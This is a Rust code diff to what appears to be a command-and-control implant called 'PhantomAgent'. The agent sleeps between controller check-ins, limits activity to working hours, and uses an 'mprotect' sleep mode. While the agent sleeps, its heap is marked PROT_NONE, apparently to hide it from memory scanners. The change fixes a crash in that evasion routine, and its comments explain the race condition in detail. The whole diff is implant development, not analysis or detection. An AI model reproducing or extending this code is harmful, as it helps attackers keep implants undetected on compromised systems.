@@ -41,7 +41,17 @@ impl PhantomAgent {
 
             let delay = Duration::from_millis(self.compute_sleep_delay());
             let mode = self.config.sleep_mode;
-            let _ = tokio::task::spawn_blocking(move || blocking_sleep(delay, mode)).await;
+            // Call blocking_sleep directly — do NOT use spawn_blocking here.
+            //
+            // mprotect_sleep marks the heap PROT_NONE for the entire sleep
+            // window.  spawn_blocking would let the Tokio scheduler run other
+            // tasks (timer callbacks, I/O events) on the main thread while the
+            // blocking thread holds PROT_NONE, racing and causing SIGSEGV
+            // (bead 1f7q1).  With current_thread runtime (set in main.rs),
+            // calling blocking_sleep directly blocks the single executor thread
+            // in nanosleep — no concurrent threads exist, no code can touch
+            // heap memory during the PROT_NONE window.
+            blocking_sleep(delay, mode);
             match self.checkin().await {
                 Ok(true) => break,
                 Ok(false) => {}
@@ -72,7 +82,9 @@ impl PhantomAgent {
         info!(delay_ms, "outside working hours; sleeping until window opens");
         let delay = Duration::from_millis(delay_ms);
         let mode = self.config.sleep_mode;
-        let _ = tokio::task::spawn_blocking(move || blocking_sleep(delay, mode)).await;
+        // Same reasoning as the main loop: call directly to avoid concurrent
+        // heap access during the mprotect PROT_NONE window (bead 1f7q1).
+        blocking_sleep(delay, mode);
     }
 
     pub(super) fn compute_sleep_delay(&self) -> u64 {
